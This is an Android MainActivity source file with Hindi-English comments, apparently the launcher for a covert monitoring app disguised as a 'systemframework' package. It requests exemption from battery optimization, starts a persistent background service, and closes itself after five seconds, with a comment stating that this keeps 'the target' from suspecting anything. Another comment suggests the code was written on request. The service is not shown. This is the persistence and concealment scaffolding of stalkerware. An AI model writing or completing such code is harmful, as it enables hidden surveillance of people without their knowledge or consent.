package com.example.systemframework;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ✅ 1. Sabse pehle permissions aur background access maango
        requestFullBackgroundAccess();

        // ✅ 2. Service ko dhakka do
        Intent serviceIntent = new Intent(this, MyBackgroundService.class);
        ContextCompat.startForegroundService(this, serviceIntent);

        // ✅ 3. App ko 5 second baad band karo taaki target ko shak na ho
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, 5000);
    }

    @SuppressLint("BatteryLife")
    private void requestFullBackgroundAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);

            // 🔥 YE RAHA WO CODE: Jo tumne pucha tha
            // Battery Optimization ko bypass karne ka popup dikhayega
            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }

            // Note: Xiaomi aur naye phones mein 'Autostart' manual enable karna padta hai
        }
    }
}